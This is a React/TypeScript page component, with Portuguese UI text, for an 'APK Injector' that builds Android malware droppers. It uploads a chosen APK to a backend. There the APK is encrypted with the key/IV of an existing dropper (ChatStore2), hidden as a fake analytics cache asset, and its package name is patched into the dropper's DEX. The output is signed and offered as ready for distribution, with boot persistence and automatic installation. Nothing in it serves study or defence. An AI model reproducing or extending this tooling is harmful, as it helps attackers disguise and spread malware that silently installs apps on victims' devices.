import { useState, useRef, useCallback, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Upload,
  Shield,
  CheckCircle2,
  XCircle,
  Download,
  Package,
  Loader2,
  ChevronDown,
  ChevronUp,
  Lock,
  Cpu,
  Zap,
  Key,
  Fingerprint,
  X,
  ArrowRight,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { toast } from "sonner";

// ─── Tipos ────────────────────────────────────────────────────────────────────

type JobStatus = "idle" | "uploading" | "pending" | "processing" | "done" | "error";

interface InjectJobState {
  jobId: string | null;
  status: JobStatus;
  progress: number;
  log: string[];
  downloadUrl: string | null;
  payloadName: string | null;
  packageName: string | null;
  errorMessage: string | null;
}

const INITIAL_STATE: InjectJobState = {
  jobId: null,
  status: "idle",
  progress: 0,
  log: [],
  downloadUrl: null,
  payloadName: null,
  packageName: null,
  errorMessage: null,
};

function formatBytes(bytes: number): string {
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / 1024 / 1024).toFixed(2)} MB`;
}

function statusLabel(status: JobStatus): string {
  switch (status) {
    case "uploading": return "Enviando APK...";
    case "pending": return "Na fila de processamento...";
    case "processing": return "Injetando no dropper real...";
    case "done": return "Dropper gerado com sucesso!";
    case "error": return "Erro no processamento";
    default: return "";
  }
}

// ─── Componente ───────────────────────────────────────────────────────────────

export default function DropperInjector() {
  const [job, setJob] = useState<InjectJobState>(INITIAL_STATE);
  const [apkFile, setApkFile] = useState<File | null>(null);
  const [isDragging, setIsDragging] = useState(false);
  const [showFullLog, setShowFullLog] = useState(false);

  const apkInputRef = useRef<HTMLInputElement>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const logEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, []);

  useEffect(() => {
    if (showFullLog) logEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [job.log, showFullLog]);

  // ── Polling ────────────────────────────────────────────────────────────────

  const startPolling = useCallback((jobId: string) => {
    if (pollRef.current) clearInterval(pollRef.current);
    pollRef.current = setInterval(async () => {
      try {
        const res = await fetch(`/api/dropper/status/${jobId}`);
        if (!res.ok) return;
        const data = await res.json();
        setJob((prev) => ({
          ...prev,
          status: data.status as JobStatus,
          progress: data.progress,
          log: data.log || [],
          downloadUrl: data.downloadUrl,
          packageName: data.packageName || prev.packageName,
          errorMessage: data.errorMessage,
          payloadName: data.payloadName || prev.payloadName,
        }));
        if (data.status === "done" || data.status === "error") {
          if (pollRef.current) clearInterval(pollRef.current);
          if (data.status === "done") {
            toast.success("Dropper real gerado!", { description: "Clique em Download para baixar." });
          } else {
            toast.error("Erro na injeção", { description: data.errorMessage || "Tente novamente." });
          }
        }
      } catch { /* silencioso */ }
    }, 1500);
  }, []);

  // ── Drag & Drop ────────────────────────────────────────────────────────────

  const onDrop = useCallback((e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(false);
    const file = e.dataTransfer.files[0];
    if (file) {
      if (!file.name.toLowerCase().endsWith(".apk")) {
        toast.error("Arquivo inválido", { description: "Apenas arquivos .apk são aceitos." });
        return;
      }
      setApkFile(file);
    }
  }, []);

  // ── Submit ─────────────────────────────────────────────────────────────────

  const handleInject = useCallback(async () => {
    if (!apkFile) {
      toast.error("APK necessário", { description: "Selecione o APK alvo primeiro." });
      return;
    }

    setJob({ ...INITIAL_STATE, status: "uploading", payloadName: apkFile.name });
    setShowFullLog(false);

    const formData = new FormData();
    formData.append("apk", apkFile);

    try {
      const res = await fetch("/api/dropper/inject", { method: "POST", body: formData });
      if (!res.ok) {
        const err = await res.json();
        throw new Error(err.error || "Falha no upload");
      }
      const { jobId } = await res.json();
      setJob((prev) => ({ ...prev, jobId, status: "pending", progress: 5 }));
      startPolling(jobId);
    } catch (err) {
      setJob((prev) => ({ ...prev, status: "error", errorMessage: (err as Error).message }));
      toast.error("Falha na injeção", { description: (err as Error).message });
    }
  }, [apkFile, startPolling]);

  const handleDownload = () => {
    if (!job.jobId) return;
    const link = document.createElement("a");
    link.href = `/api/dropper/download/${job.jobId}`;
    link.download = (job.payloadName || "dropper").replace(/\.apk$/i, "") + "_dropper_injected.apk";
    link.click();
  };

  const handleReset = () => {
    if (pollRef.current) clearInterval(pollRef.current);
    setJob(INITIAL_STATE);
    setApkFile(null);
    setShowFullLog(false);
  };

  const isProcessing = ["uploading", "pending", "processing"].includes(job.status);
  const isIdle = job.status === "idle";

  // ─── Render ────────────────────────────────────────────────────────────────

  return (
    <div className="min-h-screen bg-background bg-grid-pattern relative overflow-hidden">
      {/* Glow */}
      <div
        className="pointer-events-none absolute inset-0"
        style={{ background: "radial-gradient(ellipse 80% 50% at 50% -10%, oklch(0.62 0.22 285 / 0.10), transparent)" }}
      />

      <div className="relative z-10 flex flex-col min-h-screen">
        {/* Header */}
        <header className="border-b border-border/50 backdrop-blur-sm bg-background/60 sticky top-0 z-20">
          <div className="container flex items-center justify-between h-16">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 rounded-lg bg-violet-500/10 border border-violet-500/30 flex items-center justify-center">
                <Zap className="w-4 h-4 text-violet-400" />
              </div>
              <div>
                <span className="font-semibold text-foreground tracking-tight">VPN APK Injector</span>
                <span className="ml-2 text-xs text-muted-foreground font-mono bg-muted px-1.5 py-0.5 rounded">Real Mode</span>
              </div>
            </div>
            <div className="flex items-center gap-4">
              <a href="/" className="text-xs text-muted-foreground hover:text-primary transition-colors font-medium">
                ← APK Injector
              </a>
              <a href="/dropper" className="text-xs text-muted-foreground hover:text-primary transition-colors font-medium">
                Dropper Builder →
              </a>
              <div className="flex items-center gap-2 text-xs text-muted-foreground">
                <div className="w-1.5 h-1.5 rounded-full bg-violet-400 animate-pulse" />
                Inject Mode
              </div>
            </div>
          </div>
        </header>

        <main className="flex-1 container py-12 flex flex-col items-center gap-10">

          {/* Hero */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5, ease: [0.23, 1, 0.32, 1] }}
            className="text-center max-w-2xl"
          >
            <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-violet-500/10 border border-violet-500/20 text-xs text-violet-400 font-medium mb-4">
              <Zap className="w-3 h-3" />
              Modo Real — Replica o concorrente
            </div>
            <h1 className="text-4xl font-bold tracking-tight text-foreground mb-3">
              Injete seu APK no{" "}
              <span className="bg-gradient-to-r from-violet-400 to-purple-400 bg-clip-text text-transparent">
                dropper real
              </span>
            </h1>
            <p className="text-muted-foreground text-lg leading-relaxed">
              Seu APK é criptografado com{" "}
              <code className="text-violet-400 font-mono text-sm bg-violet-500/10 px-1.5 py-0.5 rounded">AES-256-CBC</code>{" "}
              e embutido no dropper base original. O dropper descriptografa e instala o APK automaticamente.
            </p>
          </motion.div>

          {/* Badges */}
          <motion.div
            initial={{ opacity: 0, y: 16 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5, delay: 0.1, ease: [0.23, 1, 0.32, 1] }}
            className="flex flex-wrap justify-center gap-3"
          >
            {[
              { icon: Key, label: "AES-256-CBC" },
              { icon: Package, label: "Asset substituído" },
              { icon: Fingerprint, label: "Patch no DEX" },
              { icon: Lock, label: "VpnService real" },
              { icon: Cpu, label: "APK assinado" },
              { icon: Zap, label: "< 30 segundos" },
            ].map(({ icon: Icon, label }) => (
              <div key={label} className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-card border border-border text-xs text-muted-foreground">
                <Icon className="w-3.5 h-3.5 text-violet-400" />
                {label}
              </div>
            ))}
          </motion.div>

          {/* Card principal */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5, delay: 0.15, ease: [0.23, 1, 0.32, 1] }}
            className="w-full max-w-2xl"
          >
            <AnimatePresence mode="wait">
              {isIdle ? (
                <motion.div
                  key="form"
                  initial={{ opacity: 0, scale: 0.97 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.97 }}
                  transition={{ duration: 0.25, ease: [0.23, 1, 0.32, 1] }}
                  className="rounded-2xl border border-border bg-card overflow-hidden"
                >
                  <div className="p-6 border-b border-border/50">
                    <h2 className="font-semibold text-foreground text-base">Selecionar APK Alvo</h2>
                    <p className="text-xs text-muted-foreground mt-1">
                      Apenas o APK é necessário — o dropper base já está configurado
                    </p>
                  </div>

                  <div className="p-6 space-y-6">
                    {/* Upload APK */}
                    <div
                      onDrop={onDrop}
                      onDragOver={(e) => { e.preventDefault(); setIsDragging(true); }}
                      onDragLeave={() => setIsDragging(false)}
                      onClick={() => apkInputRef.current?.click()}
                      className={`
                        relative cursor-pointer rounded-xl border-2 border-dashed transition-all duration-200
                        flex flex-col items-center justify-center gap-4 p-10
                        ${isDragging
                          ? "border-violet-500 bg-violet-500/5"
                          : apkFile
                          ? "border-violet-500/40 bg-violet-500/5"
                          : "border-border hover:border-violet-500/50 hover:bg-card/50 bg-card/30"
                        }
                      `}
                    >
                      {apkFile ? (
                        <>
                          <div className="w-14 h-14 rounded-2xl bg-violet-500/15 flex items-center justify-center">
                            <Package className="w-7 h-7 text-violet-400" />
                          </div>
                          <div className="text-center">
                            <p className="text-sm font-medium text-foreground">{apkFile.name}</p>
                            <p className="text-xs text-muted-foreground mt-1">{formatBytes(apkFile.size)}</p>
                          </div>
                          <button
                            onClick={(e) => { e.stopPropagation(); setApkFile(null); }}
                            className="absolute top-3 right-3 w-6 h-6 rounded-full bg-muted hover:bg-destructive/20 flex items-center justify-center transition-colors"
                          >
                            <X className="w-3.5 h-3.5 text-muted-foreground" />
                          </button>
                        </>
                      ) : (
                        <>
                          <div className="w-14 h-14 rounded-2xl bg-card border border-border flex items-center justify-center">
                            <Upload className="w-7 h-7 text-muted-foreground" />
                          </div>
                          <div className="text-center">
                            <p className="text-sm text-foreground font-medium">
                              {isDragging ? "Solte o APK aqui" : "Arraste ou clique para selecionar"}
                            </p>
                            <p className="text-xs text-muted-foreground mt-1">Apenas .apk · Máximo 200 MB</p>
                          </div>
                        </>
                      )}
                    </div>
                    <input
                      ref={apkInputRef}
                      type="file"
                      accept=".apk,application/vnd.android.package-archive"
                      className="hidden"
                      onChange={(e) => {
                        const f = e.target.files?.[0];
                        if (f) setApkFile(f);
                        e.target.value = "";
                      }}
                    />

                    {/* Info técnica */}
                    <div className="rounded-xl bg-violet-500/5 border border-violet-500/15 p-4 space-y-2">
                      <p className="text-xs font-semibold text-violet-400 flex items-center gap-1.5">
                        <Zap className="w-3.5 h-3.5" />
                        Como funciona o modo real
                      </p>
                      {[
                        "Seu APK é criptografado com AES-256-CBC (chave/IV do dropper original)",
                        "O arquivo analytics_events.cache no dropper é substituído pelo APK criptografado",
                        "O package name do seu APK é detectado e atualizado no classes.dex do dropper",
                        "O dropper final é assinado e pronto para distribuição",
                      ].map((step, i) => (
                        <div key={i} className="flex items-start gap-2">
                          <span className="text-xs font-mono text-violet-400/60 shrink-0 mt-0.5">{i + 1}.</span>
                          <p className="text-xs text-muted-foreground">{step}</p>
                        </div>
                      ))}
                    </div>

                    {/* Botão */}
                    <Button
                      onClick={handleInject}
                      disabled={!apkFile}
                      className="w-full h-12 text-sm font-semibold gap-2.5 rounded-xl transition-all"
                      style={
                        apkFile
                          ? {
                              background: "linear-gradient(135deg, oklch(0.62 0.22 285), oklch(0.55 0.25 300))",
                              color: "white",
                              boxShadow: "0 0 24px oklch(0.62 0.22 285 / 0.35)",
                            }
                          : {}
                      }
                    >
                      <Zap className="w-4 h-4" />
                      Injetar no Dropper Real
                      <ArrowRight className="w-4 h-4 ml-auto" />
                    </Button>
                  </div>
                </motion.div>
              ) : (
                // Card de progresso
                <motion.div
                  key="progress"
                  initial={{ opacity: 0, scale: 0.97 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.97 }}
                  transition={{ duration: 0.3, ease: [0.23, 1, 0.32, 1] }}
                  className="rounded-2xl border border-border bg-card overflow-hidden"
                >
                  {/* Header */}
                  <div className="px-6 pt-6 pb-4 border-b border-border/50">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${job.status === "done" ? "bg-violet-500/15" : job.status === "error" ? "bg-destructive/15" : "bg-violet-500/10"}`}>
                          {job.status === "done" ? (
                            <CheckCircle2 className="w-5 h-5 text-violet-400" />
                          ) : job.status === "error" ? (
                            <XCircle className="w-5 h-5 text-destructive" />
                          ) : (
                            <Loader2 className="w-5 h-5 text-violet-400 animate-spin" />
                          )}
                        </div>
                        <div>
                          <p className="font-semibold text-foreground text-sm">
                            {job.status === "done" ? "Dropper Real" : "Processando..."}
                          </p>
                          <p className="text-xs text-muted-foreground font-mono">{job.payloadName}</p>
                        </div>
                      </div>
                      {!isProcessing && (
                        <Button variant="ghost" size="sm" onClick={handleReset} className="text-muted-foreground hover:text-foreground text-xs">
                          Novo inject
                        </Button>
                      )}
                    </div>
                  </div>

                  {/* Progresso */}
                  <div className="px-6 py-5">
                    <div className="flex items-center justify-between mb-2">
                      <span className={`text-sm font-medium ${job.status === "done" ? "text-violet-400" : job.status === "error" ? "text-destructive" : "text-foreground"}`}>
                        {statusLabel(job.status)}
                      </span>
                      <span className="text-xs font-mono text-muted-foreground">{job.progress}%</span>
                    </div>
                    <Progress
                      value={job.progress}
                      className={`h-2 ${job.status === "error" ? "[&>div]:bg-destructive" : "[&>div]:bg-violet-500"} ${isProcessing ? "animate-progress-glow" : ""}`}
                    />
                  </div>

                  {/* Log */}
                  {job.log.length > 0 && (
                    <div className="px-6 pb-6">
                      <button
                        onClick={() => setShowFullLog((v) => !v)}
                        className="flex items-center gap-2 text-xs text-muted-foreground hover:text-foreground transition-colors mb-3 w-full"
                      >
                        <div className="flex-1 h-px bg-border" />
                        <span className="flex items-center gap-1.5 shrink-0">
                          {showFullLog ? <><ChevronUp className="w-3.5 h-3.5" /> Ocultar log</> : <><ChevronDown className="w-3.5 h-3.5" /> Ver log ({job.log.length} linhas)</>}
                        </span>
                        <div className="flex-1 h-px bg-border" />
                      </button>

                      <AnimatePresence>
                        {showFullLog && (
                          <motion.div
                            initial={{ height: 0, opacity: 0 }}
                            animate={{ height: "auto", opacity: 1 }}
                            exit={{ height: 0, opacity: 0 }}
                            transition={{ duration: 0.25, ease: [0.23, 1, 0.32, 1] }}
                            className="overflow-hidden"
                          >
                            <div className="rounded-xl bg-background/80 border border-border/50 p-4 max-h-64 overflow-y-auto">
                              <div className="space-y-1">
                                {job.log.map((line, i) => (
                                  <motion.p
                                    key={i}
                                    initial={{ opacity: 0, x: -8 }}
                                    animate={{ opacity: 1, x: 0 }}
                                    transition={{ duration: 0.2, delay: i * 0.02 }}
                                    className="text-xs font-mono text-muted-foreground leading-relaxed"
                                  >
                                    {line}
                                  </motion.p>
                                ))}
                                <div ref={logEndRef} />
                              </div>
                            </div>
                          </motion.div>
                        )}
                      </AnimatePresence>

                      {/* Resumo de sucesso */}
                      {job.status === "done" && (
                        <motion.div
                          initial={{ opacity: 0, y: 8 }}
                          animate={{ opacity: 1, y: 0 }}
                          transition={{ duration: 0.3, ease: [0.23, 1, 0.32, 1] }}
                          className="mt-4 rounded-xl border border-violet-500/20 bg-violet-500/5 p-4"
                        >
                          <p className="text-xs font-semibold text-violet-400 mb-2 flex items-center gap-1.5">
                            <CheckCircle2 className="w-3.5 h-3.5" />
                            Dropper real gerado com sucesso
                          </p>
                          <div className="space-y-1.5">
                            {[
                              { icon: Package, label: "Dropper base", sub: "com.tendo.data (ChatStore2)" },
                              { icon: Key, label: "Criptografia", sub: "AES-256-CBC (chave/IV do dropper original)" },
                              { icon: Fingerprint, label: "Package alvo", sub: job.packageName || "Detectado automaticamente" },
                              { icon: Cpu, label: "APK assinado", sub: "uber-apk-signer (debug key)" },
                            ].map(({ icon: Icon, label, sub }) => (
                              <div key={label} className="flex items-start gap-2">
                                <Icon className="w-3.5 h-3.5 text-violet-400 mt-0.5 shrink-0" />
                                <div>
                                  <p className="text-xs text-foreground font-medium">{label}</p>
                                  <p className="text-xs text-muted-foreground font-mono truncate max-w-xs">{sub}</p>
                                </div>
                              </div>
                            ))}
                          </div>
                        </motion.div>
                      )}

                      {/* Erro */}
                      {job.status === "error" && job.errorMessage && (
                        <motion.div
                          initial={{ opacity: 0, y: 8 }}
                          animate={{ opacity: 1, y: 0 }}
                          className="mt-4 rounded-xl border border-destructive/20 bg-destructive/5 p-4"
                        >
                          <p className="text-xs font-semibold text-destructive mb-1 flex items-center gap-1.5">
                            <XCircle className="w-3.5 h-3.5" />
                            Detalhes do erro
                          </p>
                          <p className="text-xs font-mono text-muted-foreground">{job.errorMessage}</p>
                        </motion.div>
                      )}
                    </div>
                  )}

                  {/* Download */}
                  {job.status === "done" && (
                    <motion.div
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ duration: 0.35, ease: [0.23, 1, 0.32, 1] }}
                      className="px-6 pb-6"
                    >
                      <Button
                        onClick={handleDownload}
                        className="w-full h-12 text-sm font-semibold gap-2.5 rounded-xl"
                        style={{
                          background: "linear-gradient(135deg, oklch(0.62 0.22 285), oklch(0.55 0.25 300))",
                          color: "white",
                          boxShadow: "0 0 24px oklch(0.62 0.22 285 / 0.35)",
                        }}
                      >
                        <Download className="w-4.5 h-4.5" />
                        Baixar Dropper Real
                      </Button>
                    </motion.div>
                  )}

                  {/* Tentar novamente */}
                  {job.status === "error" && (
                    <div className="px-6 pb-6">
                      <Button onClick={handleReset} variant="outline" className="w-full h-12 text-sm font-semibold gap-2 rounded-xl">
                        <Upload className="w-4 h-4" />
                        Tentar novamente
                      </Button>
                    </div>
                  )}
                </motion.div>
              )}
            </AnimatePresence>
          </motion.div>

          {/* Info cards */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5, delay: 0.25, ease: [0.23, 1, 0.32, 1] }}
            className="w-full max-w-2xl grid grid-cols-1 sm:grid-cols-3 gap-4"
          >
            {[
              { icon: Key, title: "AES-256-CBC", desc: "O APK é criptografado com a mesma chave/IV usada pelo dropper original para descriptografar" },
              { icon: Fingerprint, title: "Patch no DEX", desc: "O package name do APK alvo é detectado e atualizado no classes.dex do dropper com recálculo de checksums" },
              { icon: Zap, title: "Dropper real", desc: "O dropper base é o ChatStore2.apk original — com VpnService, BootReceiver e PackageInstaller reais" },
            ].map(({ icon: Icon, title, desc }) => (
              <div key={title} className="rounded-xl border border-border bg-card/50 p-4 flex flex-col gap-2">
                <div className="w-8 h-8 rounded-lg bg-violet-500/10 flex items-center justify-center">
                  <Icon className="w-4 h-4 text-violet-400" />
                </div>
                <p className="text-sm font-semibold text-foreground">{title}</p>
                <p className="text-xs text-muted-foreground leading-relaxed">{desc}</p>
              </div>
            ))}
          </motion.div>
        </main>

        {/* Footer */}
        <footer className="border-t border-border/50 py-6">
          <div className="container flex items-center justify-center gap-2 text-xs text-muted-foreground">
            <Shield className="w-3.5 h-3.5 text-violet-400/60" />
            <span>VPN APK Injector — Real Dropper Mode</span>
          </div>
        </footer>
      </div>
    </div>
  );
}
